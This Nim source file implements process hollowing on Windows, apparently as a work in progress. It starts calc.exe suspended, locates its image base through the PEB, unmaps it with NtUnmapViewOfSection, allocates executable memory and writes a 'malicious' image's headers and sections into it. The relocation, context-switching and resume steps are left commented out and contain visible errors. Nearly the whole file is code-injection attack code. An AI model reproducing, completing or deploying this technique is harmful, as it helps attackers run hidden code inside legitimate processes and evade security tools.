import winim/inc/windef
import winim/inc/winbase
import winim/inc/imagehlp
import winim/lean
import strutils
import dynlib

type
    ProcNtUnmapViewOfSection = proc (ProcessHandle: HANDLE, BaseAddress: PVOID): NTSTATUS {.stdcall.}
    BASE_RELOCATION_BLOCK* {.pure} = object
        PageAddress*: DWORD
        BlockSize*: DWORD
    PBASE_RELOCATION_BLOCK* = ptr BASE_RELOCATION_BLOCK
    TYPE_BASE_RELOCATION_ENTRY* {.pure} = object
        Offset*: USHORT
        Type*: USHORT
    PBASE_RELOCATION_ENTRY* = ptr TYPE_BASE_RELOCATION_ENTRY
const
    BASE_RELOCATION_ENTRY* = TYPE_BASE_RELOCATION_ENTRY(
        Offset: 12, Type: 4
    )

var
    bufsize = int32(MAX_PATH)
    sourceFileName: wstring = newWString(bufsize)
    maliciousFileName: wstring
    x: int
    pi: PROCESS_INFORMATION
    si: STARTUPINFOW
    pbi: PROCESS_BASIC_INFORMATION
    dwReturnLength: DWORD
    peb: pointer
    maliciousImageDOSHeader: PIMAGE_DOS_HEADER
    pMaliciousImageDosHeader: PIMAGE_DOS_HEADER
    pLoadedImage: ref LOADED_IMAGE
    pMaliciousLoadedImage: ref LOADED_IMAGE
    bytesRead: DWORD
    maliciousImageNTHeaders: PIMAGE_NT_HEADERS
    maliciousFileNTHeaders: PIMAGE_NT_HEADERS

when isMainModule:
    # Get the path of the current executable (compiled by nim)
    x = GetModuleFileNameW(0, &sourceFileName, bufsize)
    
    if x == 0:
        echo "[!] GetModuleFileNameW failed. Error: ", GetLastError()
        system.quit(1)
    else:
        echo "[+] PATH of the executable:\n\t", sourceFileName

    # Get the path of the binary "helloworld.exe" stored in the same directory
    # as the current one
    var t = `-$` sourceFileName
    var y = rfind(t.string, r"\")    
    # maliciousFileName = `+$` t[0..y].string & "helloworld.exe"
    maliciousFileName = `+$` r"C:\Windows\SysWOW64\calc.exe"
    
    echo "[+] PATH of the malicious file:\n\t", $ maliciousFileName

    # create suspended process from svchost.exe
    # basicallly the "trojan horse"
    x = CreateProcessW(NULL,`+$` maliciousFileName, NULL, NULL, 0, CREATE_SUSPENDED, NULL, NULL, &si, &pi)
    if x == 0:
        echo "[!] CreateProcessW failed. Error: ", GetLastError()
        system.quit(1)
    else:
        echo "[+] Successfully created the suspended process"

    x = GetProcessId(pi.hProcess)
    if x == 0:
        echo "[!] GetProcessId failed. Error: ", GetLastError()
    else:
        echo "[+] PID: ", x

    # get the base address of the PEB
    x = NtQueryInformationProcess(pi.hProcess, 0, &pbi, cast[ULONG](sizeof(PROCESS_BASIC_INFORMATION)), &dwReturnLength)
    if x != 0:
        echo "[!] NtQueryInformationProcess failed. NTSTATUS value: ", x
        echo "\n\tValue of ReturnLength: ", dwReturnLength
        system.quit(1)
    else:
        echo "[+] PEB Base address: ", toHex(cast[ByteAddress](pbi.PebBaseAddress))
        echo "\tValue of ReturnLength: ", dwReturnLength

    # get the base address of the malicious image
    let maliciousBaseImageAddressOffset : pointer = cast[pointer](cast[ByteAddress](pbi.PebBaseAddress) + 8)

    echo "[+] Malicious image address offset: ",  toHex(cast[ByteAddress](maliciousBaseImageAddressOffset))
    
    # x = ReadProcessMemory(pi.hProcess, pbi.PebBaseAddress, &peb, (SIZE_T) sizeof(PEB64), NULL)
    # if x == 0:
    #     echo "[!] ReadProcessMemory failed. Error: ", GetLastError()
    #     system.quit(1)
    # else:
    #     echo "[+] Image base address: ", toHex(cast[LONGLONG](peb.ImageBaseAddress))

    var maliciousBaseImageAddress: int
    var lpNumberOfBytesRead: SIZE_T 

    x = ReadProcessMemory(pi.hProcess, maliciousBaseImageAddressOffset, &maliciousBaseImageAddress, cast[SIZE_T](sizeof(pointer)), &lpNumberOfBytesRead)
    if x == 0:
        echo "[!] ReadProcessMemory failed. Error: ", GetLastError(), "\n\t"
        system.quit(1)
    else:
        echo "[+] ReadProcessMemory succeeded",
            "\n\tNumber of bytes copied: ", lpNumberOfBytesRead,
            "\n\tPEB Image Base Address: ", toHex(cast[int](maliciousBaseImageAddress))

    # read data from source file
    var maliciousFileHandle: HANDLE = CreateFileW(maliciousFileName, GENERIC_READ, 0, NULL, OPEN_ALWAYS, 0, 0)
    if maliciousFileHandle == INVALID_HANDLE_VALUE:
        echo "[!] CreateFileW failed. Error: ", GetLastError()
        system.quit(1)
    else:
        echo "[+] Successfully got a handle on the malicious file: ", maliciousFileName

    var maliciousFileSize: DWORD = GetFileSize(maliciousFileHandle, NULL)
    var maliciousFileBytesBuffer: pointer = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, maliciousFileSize)

    x = ReadFile(maliciousFileHandle, maliciousFileBytesBuffer, maliciousFileSize, NULL, NULL)
    if x == 0:
        echo "[!] ReadFile failed. Error: ", GetLastError()
        system.quit(1)
    else:
        echo "[+] Successfully read the bytes from the malicious file.\n\tSize: ", maliciousFileSize

    pLoadedImage = new(LOADED_IMAGE)
    maliciousImageDOSHeader = cast[PIMAGE_DOS_HEADER](maliciousFileBytesBuffer)
    maliciousImageNTHeaders = cast[PIMAGE_NT_HEADERS](cast[ByteAddress](maliciousFileBytesBuffer) + maliciousImageDOSHeader.e_lfanew)
    let maliciousImageSize: int = maliciousImageNTHeaders.OptionalHeader.SizeOfImage

    echo "[+] DOS Header address: ", toHex(cast[ByteAddress](maliciousFileBytesBuffer))
    echo "[+] DOS Header structure:\n\tMagic number: ", toHex(maliciousImageDOSHeader.e_magic),
        "\n\tSize of last page: ", maliciousImageDOSHeader.e_cblp,
        "\n\tNumber of pages: ", maliciousImageDOSHeader.e_cp,
        "\n\tRelocations: ", maliciousImageDOSHeader.e_crlc,
        "\n\tSize of header in paragraphs: ", maliciousImageDOSHeader.e_cparhdr,
        "\n\tMinimum extra paragraphs needed: ", maliciousImageDOSHeader.e_minalloc,
        "\n\tMaximum extra paragraphs needed: ", maliciousImageDOSHeader.e_maxalloc,
        "\n\tInitial (relative) SS value: ", maliciousImageDOSHeader.e_ss,
        "\n\tInitial SP value: ", maliciousImageDOSHeader.e_sp,
        "\n\tChecksum: ", maliciousImageDOSHeader.e_csum,
        "\n\tInitial IP value: ", maliciousImageDOSHeader.e_ip,
        "\n\tInitial (relative) CS value: ", maliciousImageDOSHeader.e_cs,
        "\n\tFile address of relocation table: ", maliciousImageDOSHeader.e_lfarlc,
        "\n\tOverlay number: ", maliciousImageDOSHeader.e_ovno,
        "\n\tReserved words: ", maliciousImageDOSHeader.e_res,
        "\n\tOEM identifier (for e_oeminfo): ", maliciousImageDOSHeader.e_oemid,
        "\n\tOEM information; e_oemid specific: ", maliciousImageDOSHeader.e_oeminfo,
        "\n\tReserved words: ", maliciousImageDOSHeader.e_res2,
        "\n\tFile address of new exe header: ", maliciousImageDOSHeader.e_lfanew

    echo "[+] PE File Header address: ", toHex(cast[ByteAddress](maliciousImageNTHeaders))
    echo "[+] PE File Header structure:\n\tMachine: ", toHex(maliciousImageNTHeaders.FileHeader.Machine),
        "\n\tNumber of sections: ",  maliciousImageNTHeaders.FileHeader.NumberOfSections,
        "\n\tTimestamp: ",  toHex(maliciousImageNTHeaders.FileHeader.TimeDateStamp),
        "\n\tPointer to symbol table: ",  maliciousImageNTHeaders.FileHeader.PointerToSymbolTable,
        "\n\tNumber of symbols: ",  maliciousImageNTHeaders.FileHeader.NumberOfSymbols,
        "\n\tSize of optional header: ",  maliciousImageNTHeaders.FileHeader.SizeOfOptionalHeader,
        "\n\tCharacteristics: ",  maliciousImageNTHeaders.FileHeader.Characteristics


    #[
        1. Load NTDLL library
        2. use "symAddr" (similar to GetProcAddress) to get the address of NtUnmapViewOfSection
        3. use NtUnmapViewOfSection to unmap (carve out) the destination image
    ]#
    let ntdll: LibHandle = loadLib("ntdll")
    if isNil(ntdll):
        echo "[!] Failed to load ntdll.dll"
        system.quit(1)

    let desiredFunctionAddress = ntdll.symAddr("NtUnmapViewOfSection")
    let NtUnmapViewOfSection = cast[ProcNtUnmapViewOfSection](desiredFunctionAddress)
    if isNil(NtUnmapViewOfSection):
        echo "[!] Failed to get the address of 'NtUnmapViewOfSection'"
        system.quit(1)
    else:
        echo "[+] Address of the function NtUnmapViewOfSection: ", toHex(cast[ByteAddress](desiredFunctionAddress))
    
    echo "[+] Unmapping section from address: ", toHex(cast[ByteAddress](maliciousBaseImageAddress))
    let unmapNTStatus : NTSTATUS = NtUnmapViewOfSection(pi.hProcess, cast[pointer](maliciousBaseImageAddress))
    if unmapNTStatus != 0:
        echo "[!] NtUnmapViewOfSection failed. NTSTATUS error: ", toHex(unmapNTStatus)
        system.quit(1)
    else:
        echo "[+] Unmapped the bytes from the benign process"


    # Allocate memory in the new process to make space for the malicious image
    let allocatedMemoryBaseAddress : LPVOID = VirtualAllocEx(pi.hProcess, cast[pointer](maliciousBaseImageAddress), cast[SIZE_T](maliciousImageSize), MEM_COMMIT or MEM_RESERVE, PAGE_EXECUTE_READWRITE)
    if isNil(allocatedMemoryBaseAddress):
        echo "[!] VirtualAllocEx failed. Error: ", GetLastError()
        system.quit(1)
    else:
        echo "[+] Managed to allocate memory in the benign process",
            "\n\tOld base address: ", toHex(cast[ByteAddress](maliciousBaseImageAddress)),
            "\n\tNew base address: ", toHex(cast[ByteAddress](allocatedMemoryBaseAddress)),
            "\n\tNumber of bytes: ", maliciousImageSize

        maliciousBaseImageAddress = cast[ByteAddress](allocatedMemoryBaseAddress)

        
    
    # Change the pointer of the image in the NT headers
    maliciousImageNTHeaders.OptionalHeader.ImageBase = cast[DWORD](maliciousBaseImageAddress)

    x = WriteProcessMemory(pi.hProcess, cast[pointer](maliciousBaseImageAddress), maliciousFileBytesBuffer, maliciousImageNTHeaders.OptionalHeader.SizeOfHeaders, NULL)
    if x == 0:
        echo "[!] WriteProcessMemory failed. Error:", GetLastError()
        system.quit(1)
    else:
        echo "[+] Managed to write process memory"


    # Copy each section from the malicious image
    let sectionHeaderOffset = sizeof(IMAGE_SECTION_HEADER)
    var maliciousImageSectionHeader: PIMAGE_SECTION_HEADER = IMAGE_FIRST_SECTION(cast[PIMAGE_NT_HEADERS](cast[ByteAddress](maliciousFileBytesBuffer) + maliciousImageDOSHeader.e_lfanew + sectionHeaderOffset))
    var maliciousImageSectionHeaderOld : PIMAGE_SECTION_HEADER = maliciousImageSectionHeader

    for i in countup(0, cast[int](maliciousImageNTHeaders.FileHeader.NumberOfSections - 1)):
        echo "[+] Copying data from the section: ", &maliciousImageSectionHeader.Name
        echo "\tSection address: ", toHex(cast[ByteAddress](maliciousImageSectionHeader))
        echo "\tDOS Header address: ", toHex(cast[ByteAddress](pMaliciousImageDosHeader))
        echo "\tPointer to raw data: ", maliciousImageSectionHeader.PointerToRawData
        echo "\tSize of raw data: ", maliciousImageSectionHeader.SizeOfRawData
        
        let benignProcessSectionAddress: pointer = cast[pointer](cast[ByteAddress](maliciousBaseImageAddress) + maliciousImageSectionHeader.VirtualAddress)
        let maliciousImageSectionBuffer: pointer = cast[pointer](cast[ByteAddress](maliciousFileBytesBuffer) + maliciousImageSectionHeader.PointerToRawData)

        x = WriteProcessMemory(pi.hProcess, benignProcessSectionAddress, maliciousImageSectionBuffer, maliciousImageSectionHeader.SizeOfRawData, NULL)
        if x == 0:
            echo "[!] WriteProcessMemory failed. Error: ", GetLastError()
            system.quit(1)
        else:
            echo "[+] Successfully copied the section from the malicious image to the benign one"

        # calculate the address of the next section
        let sectionHeaderNextAddress: pointer = cast[pointer](cast[ByteAddress](maliciousImageSectionHeader) + sectionHeaderOffset)
        maliciousImageSectionHeader = cast[ptr IMAGE_SECTION_HEADER](sectionHeaderNextAddress)

        #[
            By the way, the operator "[]" is used for dereferencing a pointer
            type is used to get the type
            echo type(maliciousImageSectionHeader[])
            therefore, from PIMAGE_SECTION_HEADER you'll get IMAGE_SECTION_HEADER.
        ]#


    #[
        1. Get the address of the relocation table
        2. Calculate the relocation delta
        3. Relocate data
    ]#

    let relocationTable: IMAGE_DATA_DIRECTORY = maliciousImageNTHeaders.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC]
    let relocationDelta : int = cast[int](cast[ByteAddress](maliciousBaseImageAddress) - maliciousImageNTHeaders.OptionalHeader.ImageBase)
    echo "[+] Relocation delta: ", relocationDelta

    maliciousImageSectionHeader = maliciousImageSectionHeaderOld
    maliciousImageSectionHeader = IMAGE_FIRST_SECTION(maliciousImageNTHeaders)

    for i in countup(0, cast[int](maliciousImageNTHeaders.FileHeader.NumberOfSections) - 1):
        if not (".reloc" in $ &maliciousImageSectionHeader.Name):
            echo "[+] Ignoring section: ", &maliciousImageSectionHeader.Name

            let sectionHeaderNextAddress = cast[ByteAddress](maliciousImageSectionHeader) + sectionHeaderOffset
            maliciousImageSectionHeader = cast[ptr IMAGE_SECTION_HEADER](sectionHeaderNextAddress)
            continue

        echo "[+] Relocating section: ", &maliciousImageSectionHeader.Name
        echo "\tSection address: ", toHex(cast[int64](maliciousImageSectionHeader))

    #     let dwRelocAddr: DWORD = maliciousImageSectionHeader.PointerToRawData
    #     var dwOffset = 0;
    #     let relocData: IMAGE_DATA_DIRECTORY = maliciousFileNTHeaders.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC]

    #     echo "[+] Size of data to be relocated: ", relocData.Size

    #     while dwOffset < relocData.Size:
    #         let pBlockheader: PBASE_RELOCATION_BLOCK = cast[PBASE_RELOCATION_BLOCK](buffer[dwRelocAddr + dwOffset])

    #         dwOffset += sizeof(BASE_RELOCATION_BLOCK)
            
    #         var dwEntryCount: DWORD = cast[DWORD]((pBlockheader.BlockSize - sizeof(BASE_RELOCATION_BLOCK)) / sizeof(BASE_RELOCATION_ENTRY))

    #         var pBlocks: PBASE_RELOCATION_ENTRY = cast[PBASE_RELOCATION_ENTRY](buffer[dwRelocAddr + dwOffset])
            
    #         for k in countup(0, dwEntryCount - 1):
    #             dwOffset += sizeof(BASE_RELOCATION_ENTRY)

    #             echo "[+] Base Relocation Entry Type: ", pBlocks.Type

    #             if pBlocks.Type == 0:
    #                 let baseRelocationEntrySize = sizeof(BASE_RELOCATION_ENTRY)
    #                 let sectionHeaderOffset = 1 * baseRelocationEntrySize
    #                 let baseRelocationEntryNextAddress = cast[ByteAddress](pBlocks) + sectionHeaderOffset
    #                 pBlocks = cast[PBASE_RELOCATION_ENTRY](baseRelocationEntryNextAddress)
    #                 continue

    #             let fieldAddress: DWORD = pBlockheader.PageAddress + cast[DWORD](pBlocks.Offset)
    #             var buffer3: DWORD

    #             x = ReadProcessMemory(pi.hProcess, cast[pointer](cast[ByteAddress](peb.ImageBaseAddress) + fieldAddress), &buffer3, sizeof(DWORD), NULL)
    #             if x == 0:
    #                 echo "[!] ReadProcessMemory failed. Error: ", GetLastError()
    #                 system.quit(1)

    #             buffer3 += relocationDelta

    #             x = WriteProcessMemory(pi.hProcess, cast[pointer](cast[ByteAddress](peb.ImageBaseAddress) + fieldAddress), &buffer3, sizeof(DWORD), NULL)
    #             if x == 0:
    #                 echo "[!] WriteProcessMemory failed. Error: ", GetLastError()
    #                 system.quit(1)

    #     break

    # let dwEntrypoint : int64 = cast[int64](cast[ByteAddress](allocatedMemoryBaseAddress) + maliciousFileNTHeaders.OptionalHeader.AddressOfEntryPoint)

    # var pContext: CONTEXT
    # pContext.ContextFlags = CONTEXT_INTEGER

    # x = GetThreadContext(pi.hThread, &pContext)
    # if x == 0:
    #     echo "[!] GetThreadContext failed. Error: ", GetLastError()
    #     system.quit(1)
    # else:
    #     echo "[+] Successfully retrieved the context of the new thread"

    # pContext.Rcx = dwEntrypoint

    # WriteProcessMemory(pi.hProcess, cast[pointer](pContext.Rdx + 16), allocatedMemoryBaseAddress, 8, NULL)
    # if x == 0:
    #     echo "[!] WriteProcessMemory failed. Error: ", GetLastError()
    #     system.quit(1)

    # x = SetThreadContext(pi.hThread, &pContext)
    # if x == 0:
    #     echo "[!] SetThreadContext failed. Error: ", GetLastError()
    #     system.quit(1)
    # else:
    #     echo "[+] Successfully set the thread context with the correct entry address"
    #     echo "[+] Entry address: ", toHex(dwEntrypoint)

    # x = ResumeThread(pi.hThread)
    # if x == -1:
    #     echo "[!] SetThreadContext failed. Error: ", GetLastError()
    #     system.quit(1)
    # else:
    #     echo "[+] Thread resumed"

    # NtWaitForSingleObject(pi.hProcess, FALSE, NULL)
    # echo "[+] Process hollowing finished"